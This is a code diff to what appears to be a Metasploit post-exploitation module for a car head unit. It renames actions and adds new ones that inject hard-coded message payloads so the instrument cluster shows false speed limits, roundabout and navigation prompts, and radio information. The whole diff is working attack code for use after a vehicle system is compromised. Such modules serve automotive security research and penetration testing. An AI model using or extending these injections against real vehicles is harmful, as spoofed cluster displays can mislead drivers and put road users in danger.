@@ -41,11 +41,15 @@ class MetasploitModule < Msf::Post
           [ 'SET_NAVIGATION_ADDRESS', { 'Description' => 'It pops up the navigation address window' } ],
           [ 'SEEK_DOWN_SEARCH', { 'Description' => 'It triggers the seek down radio frequency search' } ],
           [ 'SEEK_UP_SEARCH', { 'Description' => 'It triggers the seek up radio frequency search' } ],
-          [ 'SWITCH_ON_Hu', { 'Description' => 'It switches on the head unit' } ],
-          [ 'SWITCH_OFF_Hu', { 'Description' => 'It switches off the head unit' } ],
+          [ 'SWITCH_ON_HU', { 'Description' => 'It switches on the head unit' } ],
+          [ 'SWITCH_OFF_HU', { 'Description' => 'It switches off the head unit' } ],
           [ 'CAMERA_REVERSE_ON', { 'Description' => 'It shows the parking camera video stream' } ],
           [ 'CAMERA_REVERSE_OFF', { 'Description' => 'It hides the parking camera video stream' } ],
-          [ 'CHANGE_CLUSTER_LANGUAGE', { 'Description' => 'It changes the cluster language' } ],
+          [ 'CLUSTER_CHANGE_LANGUAGE', { 'Description' => 'It changes the cluster language' } ],
+          [ 'CLUSTER_SPEED_LIMIT', { 'Description' => 'It changes the speed limit shown in the instrument cluster' } ],
+          [ 'CLUSTER_ROUNDABOUT_FARAWAY', { 'Description' => 'It shows a round about signal with variable distance in the instrument cluster ' } ],
+          [ 'CLUSTER_RANDOM_NAVIGATION', { 'Description' => 'It shows navigation signals in the instrument cluster ' } ],
+          [ 'CLUSTER_RADIO_INFO', { 'Description' => 'It shows radio info in the instrument cluster ' } ],
           [ 'INJECT_CUSTOM', { 'Description' => 'It injects custom micom payloads' } ]
         ],
         'DefaultAction' => 'TOGGLE_RADIO_MUTE',
@@ -180,7 +184,7 @@ class MetasploitModule < Msf::Post
     send_in('8353 03 00')
   end
 
-  def action_change_cluster_language
+  def action_cluster_change_language
     print_status(' -- Korean -- ')
     send_out_custom('4D3 01')
     print_status(' -- Arabic -- ')
@@ -189,6 +193,57 @@ class MetasploitModule < Msf::Post
     send_out_custom('4D3 0E')
     print_status(' -- Italian -- ')
     send_out_custom('4D3 12')
+  end
+
+  def action_cluster_speed_limit
+    print_status(' -- Chaning speed limit on the instrument cluster -- ')
+    send_out_custom('4DB 00 0A')
+    send_out_custom('4DB 00 2A')
+    send_out_custom('4DB 00 3A')
+    send_out_custom('4DB 00 5A')
+    send_out_custom('4DB 00 7A')
+    send_out_custom('4DB 00 9A')
+    send_out_custom('4DB 00 AA')
+    send_out_custom('4DB 00 BA')
+  end
+
+  def action_cluster_roundabout_faraway
+    print_status(' -- km -- ')
+    send_out_custom('4D1 66 00 00 00 14 86 10 00')
+    print_status(' -- mi -- ')
+    send_out_custom('4D1 66 00 00 00 14 86 20 00')
+    print_status(' -- ft -- ')
+    send_out_custom('4D1 66 00 00 00 14 86 30 00')
+    print_status(' -- yd -- ')
+    send_out_custom('4D1 66 00 00 00 14 86 40 00')
+    print_status(' -- No distance -- ')
+    send_out_custom('4D1 66 00 00 00 14 86 50 00')
+  end
+
+  def action_cluster_random_navigation
+    print_status(' -- Calculating the route -- ')
+    send_out_custom('4D1 09')
+    print_status(' -- Recalculating the route -- ')
+    send_out_custom('4D1 0A')
+    print_status(' -- Straight ahead -- ')
+    send_out_custom('4D1 0D')
+    print_status(' -- Exit on the Right -- ')
+    send_out_custom('4D1 13')
+    print_status(' -- Exit on the Left -- ')
+    send_out_custom('4D1 14')
+  end
+
+  def action_cluster_radio_info
+    print_status(' -- USB Music -- ')
+    send_out_custom('4D6 65')
+    print_status(' -- Android Auto -- ')
+    send_out_custom('4D6 6F')
+    print_status(' -- FM 168.17 -- ')
+    send_out_custom('4D6 11 9D 00 00 00 00 5F 83')
+    print_status(' -- FM1 168.17 -- ')
+    send_out_custom('4D6 12 9D 00 00 00 00 5F 83')
+    print_status(' -- FM2 168.17 -- ')
+    send_out_custom('4D6 13 9D 00 00 00 00 5F 83')
   end
 
   def action_inject_custom
